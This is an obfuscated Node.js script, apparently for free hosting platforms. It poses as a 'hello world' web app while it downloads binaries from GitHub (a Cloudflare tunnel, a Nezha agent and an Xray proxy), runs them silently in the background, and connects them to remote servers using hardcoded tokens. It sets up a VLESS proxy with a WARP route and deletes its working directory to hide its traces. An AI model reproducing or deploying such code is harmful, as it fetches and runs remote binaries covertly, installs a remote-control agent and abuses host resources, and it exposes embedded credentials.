const token = process.env.C_T || "eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiOGM1ZjI5NjctZWRlYy00ZmRjLTllYWYtZjA0MDc1MDcxZTZiIiwicyI6Ik9EUXhZelEwWWpndE5HSTFOeTAwTldRd0xXRm1NV0l0T0RBMFlXTXpPVEJsWVRVNSJ9";
const serverHost = process.env.N_S || "nz.seav.eu.org";
const serverPort = process.env.N_P || 443;
const serverToken = process.env.N_K || "8gydd8PByXXiWXkutN";
const UUID = process.env.UUID || "feefeb96-bfcf-4a9b-aac0-6aac771c1b98";
const port = process.env.SERVER_PORT || process.env.PORT || 3000;
const cfport = 8002;
const tmpDir = './tmp';
const vlsPath = process.env.VLS_PATH || '/vls';

const _0x3e4107=_0x2d90;(function(_0xc1d198,_0x1da83c){const _0x3c70c2=_0x2d90,_0x3d4a88=_0xc1d198();while(!![]){try{const _0x2249b6=parseInt(_0x3c70c2(0x1de))/0x1+parseInt(_0x3c70c2(0x1fc))/0x2*(parseInt(_0x3c70c2(0x1e5))/0x3)+parseInt(_0x3c70c2(0x1e7))/0x4+-parseInt(_0x3c70c2(0x1d6))/0x5*(parseInt(_0x3c70c2(0x1eb))/0x6)+-parseInt(_0x3c70c2(0x1f2))/0x7+parseInt(_0x3c70c2(0x1e0))/0x8+parseInt(_0x3c70c2(0x1cc))/0x9*(-parseInt(_0x3c70c2(0x1df))/0xa);if(_0x2249b6===_0x1da83c)break;else _0x3d4a88['push'](_0x3d4a88['shift']());}catch(_0x25192e){_0x3d4a88['push'](_0x3d4a88['shift']());}}}(_0x241d,0x75209));const axios=require(_0x3e4107(0x1d3)),fs=require('fs'),{exec}=require('child_process'),express=require(_0x3e4107(0x1e4)),{createProxyMiddleware}=require('http-proxy-middleware'),http=require(_0x3e4107(0x1d4)),app=express(),URLS_x86_64=[_0x3e4107(0x203),'https://github.com/seav1/dl/releases/download/upx/nz',_0x3e4107(0x1fe)],URLS_arm=[_0x3e4107(0x1e1),'https://github.com/seav1/dl/releases/download/upx/nz-arm','https://github.com/seav1/dl/releases/download/upx/xr-arm'],FILES=['cf','nz','xr'],config={'log':{'access':_0x3e4107(0x1fa),'error':'/dev/null','loglevel':_0x3e4107(0x1f8)},'inbounds':[{'port':cfport,'protocol':_0x3e4107(0x1d8),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x3e4107(0x1f8),'fallbacks':[{'dest':0xbb9},{'path':vlsPath,'dest':0xbba}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x3e4107(0x1f1),'protocol':_0x3e4107(0x1d8),'settings':{'clients':[{'id':UUID}],'decryption':_0x3e4107(0x1f8)},'streamSettings':{'network':'ws','security':_0x3e4107(0x1f8)}},{'port':0xbba,'listen':_0x3e4107(0x1f1),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x3e4107(0x1f8)},'streamSettings':{'network':'ws','security':_0x3e4107(0x1f8),'wsSettings':{'path':vlsPath}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x3e4107(0x1e6)],'metadataOnly':![]}}],'dns':{'servers':[_0x3e4107(0x20f)]},'outbounds':[{'protocol':'freedom'},{'tag':_0x3e4107(0x1ce),'protocol':_0x3e4107(0x201),'settings':{'secretKey':_0x3e4107(0x1ed),'address':[_0x3e4107(0x1ee),_0x3e4107(0x207)],'peers':[{'publicKey':'bmXOC+F1FxEMF9dyiK2H5/1SUtzH0JuVo51h2wPfgyo=','allowedIPs':['0.0.0.0/0',_0x3e4107(0x1f0)],'endpoint':_0x3e4107(0x202)}],'reserved':[0x4e,0x87,0x4c],'mtu':0x500}}],'routing':{'domainStrategy':'AsIs','rules':[{'type':_0x3e4107(0x1f3),'domain':[_0x3e4107(0x1dc),_0x3e4107(0x1dd)],'outboundTag':_0x3e4107(0x1ce)}]}},downloadFile=async(_0x154538,_0x405970)=>{const _0x23e8b1=_0x3e4107,_0x44b38f=fs[_0x23e8b1(0x1fd)](tmpDir+'/'+_0x405970),_0x4c02c4=await axios({'url':_0x154538,'method':_0x23e8b1(0x1d9),'responseType':_0x23e8b1(0x1db)});return _0x4c02c4['data'][_0x23e8b1(0x1cf)](_0x44b38f),new Promise((_0x2e642a,_0xb9625a)=>{const _0x59cc71=_0x23e8b1;_0x44b38f['on'](_0x59cc71(0x20e),_0x2e642a),_0x44b38f['on'](_0x59cc71(0x1f7),_0xb9625a);});},executeCommand=_0x11b9d1=>{return new Promise((_0x80b243,_0x4ef853)=>{const _0x501656=_0x2d90;_0x501656(0x204)!==_0x501656(0x200)?exec(_0x11b9d1,(_0x32da90,_0x37dcb3,_0x130b99)=>{const _0xe1d79d=_0x501656;if(_0x32da90){if(_0xe1d79d(0x20d)!==_0xe1d79d(0x209)){_0x4ef853(_0xe1d79d(0x1f6)+_0x32da90);return;}else _0x4983c6['mkdirSync'](_0x2a8598,{'mode':0x1ed});}_0x80b243(_0x37dcb3?_0x37dcb3:_0x130b99);}):(_0x103e5a['on'](_0x501656(0x20e),_0x254530),_0x46ca33['on']('error',_0x504040));});},main=async()=>{const _0x2cd3b4=_0x3e4107;!fs['existsSync'](tmpDir)&&fs[_0x2cd3b4(0x1e2)](tmpDir,{'mode':0x1ed});const _0x22c7d4=process[_0x2cd3b4(0x205)]==='x64'?URLS_x86_64:URLS_arm;for(let _0x3041dd=0x0;_0x3041dd<_0x22c7d4[_0x2cd3b4(0x1ef)];_0x3041dd++){await downloadFile(_0x22c7d4[_0x3041dd],FILES[_0x3041dd]),await executeCommand('chmod\x20+x\x20'+tmpDir+'/'+FILES[_0x3041dd]);}await executeCommand(_0x2cd3b4(0x1fb)+tmpDir+_0x2cd3b4(0x1d1)+token+_0x2cd3b4(0x1f9)+cfport+_0x2cd3b4(0x1da)),await executeCommand(_0x2cd3b4(0x1fb)+tmpDir+_0x2cd3b4(0x20b)+serverHost+':'+serverPort+'\x20-p\x20'+serverToken+_0x2cd3b4(0x1ea)),fs[_0x2cd3b4(0x208)](tmpDir+_0x2cd3b4(0x1d7),JSON[_0x2cd3b4(0x1e8)](config)),await executeCommand('nohup\x20./'+tmpDir+_0x2cd3b4(0x1e3)+tmpDir+_0x2cd3b4(0x210)),setTimeout(()=>{const _0x3f9f89=_0x2cd3b4;fs[_0x3f9f89(0x1cd)](tmpDir)&&fs[_0x3f9f89(0x1ff)](tmpDir,{'recursive':!![],'force':!![]});},0x1388);};main()[_0x3e4107(0x1ec)](console[_0x3e4107(0x1f7)]),app['get']('/',(_0x2e59ab,_0x53ed22)=>{const _0x176577=_0x3e4107;_0x53ed22[_0x176577(0x1d2)](0xc8)[_0x176577(0x1e9)](_0x176577(0x1f4));});function _0x2d90(_0x1c5b23,_0x7c7dc1){const _0x241d15=_0x241d();return _0x2d90=function(_0x2d9060,_0x2c6815){_0x2d9060=_0x2d9060-0x1cc;let _0x378d47=_0x241d15[_0x2d9060];return _0x378d47;},_0x2d90(_0x1c5b23,_0x7c7dc1);}const server=http[_0x3e4107(0x20a)](app);function _0x241d(){const _0x4fb832=['send','\x20--tls\x20>/dev/null\x202>&1\x20&','1833354VqqXHE','catch','YFYOAdbw1bKTHlNNi+aEjBM3BO7unuFC5rOkMRAz9XY=','172.16.0.2/32','length','::/0','127.0.0.1','1178625vwQGrb','field','hello\x20world','upgrade','exec\x20error:\x20','error','none','\x20--url\x20http://localhost:','/dev/null','nohup\x20./','2022gIRWQe','createWriteStream','https://github.com/seav1/dl/releases/download/upx/xr','rmSync','fZMvS','wireguard','162.159.193.10:2408','https://github.com/seav1/dl/releases/download/upx/cf','aGDUb','arch','log','2606:4700:110:8a36:df92:102a:9602:fa18/128','writeFileSync','lJrDe','createServer','/nz\x20-s\x20','ws://localhost:','mrKIM','finish','https+local://8.8.8.8/dns-query','/config.json\x20>/dev/null\x202>&1\x20&','15291nsJSpV','existsSync','WARP','pipe','app\x20listening\x20on\x20port\x20','/cf\x20tunnel\x20--edge-ip-version\x20auto\x20run\x20--protocol\x20http2\x20--token\x20','status','axios','http','listen','10LKlmrP','/config.json','vless','GET','\x20>/dev/null\x202>&1\x20&','stream','domain:openai.com','domain:ai.com','226998PyiRcK','1660OaQsUO','4232312BGMrlJ','https://github.com/seav1/dl/releases/download/upx/cf-arm','mkdirSync','/xr\x20-c\x20','express','2019hnGggJ','quic','419360ZWmnTq','stringify'];_0x241d=function(){return _0x4fb832;};return _0x241d();}server['on'](_0x3e4107(0x1f5),createProxyMiddleware({'target':_0x3e4107(0x20c)+cfport,'changeOrigin':!![],'ws':!![]})),server[_0x3e4107(0x1d5)](port,()=>{const _0x2bdbd6=_0x3e4107;console[_0x2bdbd6(0x206)](_0x2bdbd6(0x1d0)+port);});
